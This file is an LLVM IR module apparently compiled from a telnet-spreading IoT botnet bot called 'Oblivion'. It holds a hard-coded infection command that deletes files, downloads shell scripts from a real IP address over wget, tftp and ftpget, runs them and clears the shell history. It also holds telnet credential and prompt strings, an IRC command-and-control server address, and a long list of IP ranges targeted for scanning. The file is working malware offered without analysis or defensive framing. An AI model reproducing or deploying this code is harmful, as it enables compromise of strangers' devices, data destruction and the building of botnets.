; ModuleID = 'host/ir_bcf/Oblivion.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infect2 = global i8* getelementptr inbounds ([507 x i8], [507 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [507 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00", align 1
@infect = global i8* getelementptr inbounds ([496 x i8], [496 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [496 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@phonepayload = global i8* getelementptr inbounds ([508 x i8], [508 x i8]* @.str.2, i32 0, i32 0), align 8
@.str.2 = private unnamed_addr constant [508 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *; history -c\0D\0A\00", align 1
@usernames = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@.str.3 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@phone = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* null], align 16
@.str.4 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@passwords = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* null], align 16
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* null], align 16
@.str.10 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@.str.17 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@infected = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@.str.20 = private unnamed_addr constant [14 x i8] c"Device Repped\00", align 1
@infectedmessage = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i8* null], align 16
@.str.21 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.24 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.29 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.31, i32 0, i32 0)], align 8
@.str.31 = private unnamed_addr constant [19 x i8] c"144.202.54.51:6667\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Phonepid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.32 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.500 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.35 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.36 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.38 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"112.5.%d.%d\00", align 1
@.str.43 = private unnamed_addr constant [14 x i8] c"117.165.%d.%d\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"85.3.%d.%d\00", align 1
@.str.45 = private unnamed_addr constant [13 x i8] c"41.252.%d.%d\00", align 1
@.str.46 = private unnamed_addr constant [13 x i8] c"104.55.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [13 x i8] c"78.186.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [13 x i8] c"78.189.%d.%d\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"221.120.%d.%d\00", align 1
@.str.50 = private unnamed_addr constant [11 x i8] c"88.5.%d.%d\00", align 1
@.str.51 = private unnamed_addr constant [13 x i8] c"41.254.%d.%d\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"103.20.%d.%d\00", align 1
@.str.53 = private unnamed_addr constant [13 x i8] c"103.47.%d.%d\00", align 1
@.str.54 = private unnamed_addr constant [13 x i8] c"103.57.%d.%d\00", align 1
@.str.55 = private unnamed_addr constant [13 x i8] c"45.117.%d.%d\00", align 1
@.str.56 = private unnamed_addr constant [13 x i8] c"101.51.%d.%d\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"137.59.%d.%d\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"14.204.%d.%d\00", align 1
@.str.59 = private unnamed_addr constant [12 x i8] c"27.50.%d.%d\00", align 1
@.str.60 = private unnamed_addr constant [12 x i8] c"27.54.%d.%d\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"27.98.%d.%d\00", align 1
@.str.62 = private unnamed_addr constant [12 x i8] c"36.32.%d.%d\00", align 1
@.str.63 = private unnamed_addr constant [13 x i8] c"36.248.%d.%d\00", align 1
@.str.64 = private unnamed_addr constant [12 x i8] c"39.64.%d.%d\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"43.253.%d.%d\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"43.230.%d.%d\00", align 1
@.str.67 = private unnamed_addr constant [13 x i8] c"163.53.%d.%d\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"43.245.%d.%d\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"123.25.%d.%d\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"103.54.%d.%d\00", align 1
@.str.71 = private unnamed_addr constant [13 x i8] c"27.255.%d.%d\00", align 1
@.str.72 = private unnamed_addr constant [14 x i8] c"103.204.%d.%d\00", align 1
@.str.73 = private unnamed_addr constant [13 x i8] c"123.24.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [14 x i8] c"113.191.%d.%d\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"113.188.%d.%d\00", align 1
@.str.76 = private unnamed_addr constant [14 x i8] c"113.189.%d.%d\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"14.160.%d.%d\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"14.161.%d.%d\00", align 1
@.str.79 = private unnamed_addr constant [13 x i8] c"14.162.%d.%d\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"14.163.%d.%d\00", align 1
@.str.81 = private unnamed_addr constant [13 x i8] c"14.164.%d.%d\00", align 1
@.str.82 = private unnamed_addr constant [13 x i8] c"14.165.%d.%d\00", align 1
@.str.83 = private unnamed_addr constant [13 x i8] c"14.166.%d.%d\00", align 1
@.str.84 = private unnamed_addr constant [13 x i8] c"14.167.%d.%d\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"14.168.%d.%d\00", align 1
@.str.86 = private unnamed_addr constant [13 x i8] c"14.169.%d.%d\00", align 1
@.str.87 = private unnamed_addr constant [13 x i8] c"14.170.%d.%d\00", align 1
@.str.88 = private unnamed_addr constant [13 x i8] c"14.171.%d.%d\00", align 1
@.str.89 = private unnamed_addr constant [13 x i8] c"14.172.%d.%d\00", align 1
@.str.90 = private unnamed_addr constant [13 x i8] c"14.173.%d.%d\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"14.174.%d.%d\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"14.175.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [13 x i8] c"14.176.%d.%d\00", align 1
@.str.94 = private unnamed_addr constant [13 x i8] c"14.177.%d.%d\00", align 1
@.str.95 = private unnamed_addr constant [13 x i8] c"14.178.%d.%d\00", align 1
@.str.96 = private unnamed_addr constant [13 x i8] c"14.179.%d.%d\00", align 1
@.str.97 = private unnamed_addr constant [13 x i8] c"14.180.%d.%d\00", align 1
@.str.98 = private unnamed_addr constant [13 x i8] c"14.181.%d.%d\00", align 1
@.str.99 = private unnamed_addr constant [13 x i8] c"14.182.%d.%d\00", align 1
@.str.100 = private unnamed_addr constant [13 x i8] c"14.183.%d.%d\00", align 1
@.str.101 = private unnamed_addr constant [13 x i8] c"14.184.%d.%d\00", align 1
@.str.102 = private unnamed_addr constant [13 x i8] c"14.185.%d.%d\00", align 1
@.str.103 = private unnamed_addr constant [13 x i8] c"14.186.%d.%d\00", align 1
@.str.104 = private unnamed_addr constant [13 x i8] c"14.187.%d.%d\00", align 1
@.str.105 = private unnamed_addr constant [13 x i8] c"14.188.%d.%d\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"14.189.%d.%d\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"14.190.%d.%d\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"14.191.%d.%d\00", align 1
@.str.109 = private unnamed_addr constant [13 x i8] c"45.121.%d.%d\00", align 1
@.str.110 = private unnamed_addr constant [13 x i8] c"45.120.%d.%d\00", align 1
@.str.111 = private unnamed_addr constant [13 x i8] c"45.115.%d.%d\00", align 1
@.str.112 = private unnamed_addr constant [13 x i8] c"43.252.%d.%d\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c"43.240.%d.%d\00", align 1
@.str.114 = private unnamed_addr constant [13 x i8] c"41.174.%d.%d\00", align 1
@.str.115 = private unnamed_addr constant [13 x i8] c"45.127.%d.%d\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"103.30.%d.%d\00", align 1
@.str.117 = private unnamed_addr constant [13 x i8] c"123.16.%d.%d\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"202.44.%d.%d\00", align 1
@.str.119 = private unnamed_addr constant [13 x i8] c"116.93.%d.%d\00", align 1
@.str.120 = private unnamed_addr constant [13 x i8] c"41.253.%d.%d\00", align 1
@.str.121 = private unnamed_addr constant [14 x i8] c"117.173.%d.%d\00", align 1
@.str.122 = private unnamed_addr constant [14 x i8] c"113.190.%d.%d\00", align 1
@.str.123 = private unnamed_addr constant [14 x i8] c"112.196.%d.%d\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"113.178.%d.%d\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"112.45.%d.%d\00", align 1
@.str.126 = private unnamed_addr constant [14 x i8] c"183.223.%d.%d\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"116.71.%d.%d\00", align 1
@.str.128 = private unnamed_addr constant [13 x i8] c"103.44.%d.%d\00", align 1
@.str.129 = private unnamed_addr constant [14 x i8] c"110.235.%d.%d\00", align 1
@.str.130 = private unnamed_addr constant [14 x i8] c"124.253.%d.%d\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"211.237.%d.%d\00", align 1
@.str.132 = private unnamed_addr constant [14 x i8] c"117.175.%d.%d\00", align 1
@.str.133 = private unnamed_addr constant [12 x i8] c"111.9.%d.%d\00", align 1
@.str.134 = private unnamed_addr constant [14 x i8] c"222.252.%d.%d\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"113.174.%d.%d\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"113.160.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"113.161.%d.%d\00", align 1
@.str.138 = private unnamed_addr constant [14 x i8] c"113.162.%d.%d\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"113.163.%d.%d\00", align 1
@.str.140 = private unnamed_addr constant [14 x i8] c"113.164.%d.%d\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"113.165.%d.%d\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"113.166.%d.%d\00", align 1
@.str.143 = private unnamed_addr constant [14 x i8] c"113.167.%d.%d\00", align 1
@.str.144 = private unnamed_addr constant [14 x i8] c"113.168.%d.%d\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"113.169.%d.%d\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"123.17.%d.%d\00", align 1
@.str.147 = private unnamed_addr constant [13 x i8] c"123.21.%d.%d\00", align 1
@.str.148 = private unnamed_addr constant [13 x i8] c"123.22.%d.%d\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"222.253.%d.%d\00", align 1
@.str.150 = private unnamed_addr constant [14 x i8] c"222.254.%d.%d\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"222.255.%d.%d\00", align 1
@.str.152 = private unnamed_addr constant [13 x i8] c"41.208.%d.%d\00", align 1
@.str.153 = private unnamed_addr constant [14 x i8] c"103.198.%d.%d\00", align 1
@.str.154 = private unnamed_addr constant [13 x i8] c"88.248.%d.%d\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"88.105.%d.%d\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"88.247.%d.%d\00", align 1
@.str.157 = private unnamed_addr constant [13 x i8] c"85.105.%d.%d\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"188.3.%d.%d\00", align 1
@.str.159 = private unnamed_addr constant [14 x i8] c"103.203.%d.%d\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"103.55.%d.%d\00", align 1
@.str.161 = private unnamed_addr constant [14 x i8] c"103.220.%d.%d\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"183.233.%d.%d\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"103.242.%d.%d\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"103.14.%d.%d\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"103.195.%d.%d\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"103.214.%d.%d\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"103.218.%d.%d\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"103.225.%d.%d\00", align 1
@.str.169 = private unnamed_addr constant [14 x i8] c"103.228.%d.%d\00", align 1
@.str.170 = private unnamed_addr constant [14 x i8] c"103.231.%d.%d\00", align 1
@.str.171 = private unnamed_addr constant [13 x i8] c"103.60.%d.%d\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"103.248.%d.%d\00", align 1
@.str.173 = private unnamed_addr constant [14 x i8] c"103.253.%d.%d\00", align 1
@.str.174 = private unnamed_addr constant [14 x i8] c"103.255.%d.%d\00", align 1
@.str.175 = private unnamed_addr constant [14 x i8] c"113.176.%d.%d\00", align 1
@.str.176 = private unnamed_addr constant [14 x i8] c"113.175.%d.%d\00", align 1
@.str.177 = private unnamed_addr constant [14 x i8] c"203.134.%d.%d\00", align 1
@.str.178 = private unnamed_addr constant [14 x i8] c"203.210.%d.%d\00", align 1
@.str.179 = private unnamed_addr constant [14 x i8] c"117.176.%d.%d\00", align 1
@.str.180 = private unnamed_addr constant [14 x i8] c"117.171.%d.%d\00", align 1
@.str.181 = private unnamed_addr constant [14 x i8] c"117.162.%d.%d\00", align 1
@.str.182 = private unnamed_addr constant [14 x i8] c"203.150.%d.%d\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"157.119.%d.%d\00", align 1
@.str.184 = private unnamed_addr constant [13 x i8] c"43.228.%d.%d\00", align 1
@.str.185 = private unnamed_addr constant [13 x i8] c"162.12.%d.%d\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"115.220.%d.%d\00", align 1
@.str.187 = private unnamed_addr constant [14 x i8] c"125.114.%d.%d\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"119.157.%d.%d\00", align 1
@.str.189 = private unnamed_addr constant [14 x i8] c"119.150.%d.%d\00", align 1
@.str.190 = private unnamed_addr constant [14 x i8] c"119.151.%d.%d\00", align 1
@.str.191 = private unnamed_addr constant [14 x i8] c"119.152.%d.%d\00", align 1
@.str.192 = private unnamed_addr constant [14 x i8] c"119.153.%d.%d\00", align 1
@.str.193 = private unnamed_addr constant [14 x i8] c"119.154.%d.%d\00", align 1
@.str.194 = private unnamed_addr constant [14 x i8] c"119.155.%d.%d\00", align 1
@.str.195 = private unnamed_addr constant [14 x i8] c"119.156.%d.%d\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"119.158.%d.%d\00", align 1
@.str.197 = private unnamed_addr constant [14 x i8] c"119.159.%d.%d\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"191.24.%d.%d\00", align 1
@.str.199 = private unnamed_addr constant [14 x i8] c"187.119.%d.%d\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"177.215.%d.%d\00", align 1
@.str.201 = private unnamed_addr constant [14 x i8] c"152.241.%d.%d\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"182.185.%d.%d\00", align 1
@.str.203 = private unnamed_addr constant [13 x i8] c"179.80.%d.%d\00", align 1
@.str.204 = private unnamed_addr constant [13 x i8] c"179.81.%d.%d\00", align 1
@.str.205 = private unnamed_addr constant [13 x i8] c"179.82.%d.%d\00", align 1
@.str.206 = private unnamed_addr constant [13 x i8] c"179.83.%d.%d\00", align 1
@.str.207 = private unnamed_addr constant [13 x i8] c"179.84.%d.%d\00", align 1
@.str.208 = private unnamed_addr constant [13 x i8] c"179.86.%d.%d\00", align 1
@.str.209 = private unnamed_addr constant [13 x i8] c"179.87.%d.%d\00", align 1
@.str.210 = private unnamed_addr constant [13 x i8] c"179.88.%d.%d\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"179.89.%d.%d\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"179.90.%d.%d\00", align 1
@.str.213 = private unnamed_addr constant [13 x i8] c"179.91.%d.%d\00", align 1
@.str.214 = private unnamed_addr constant [13 x i8] c"179.92.%d.%d\00", align 1
@.str.215 = private unnamed_addr constant [13 x i8] c"179.93.%d.%d\00", align 1
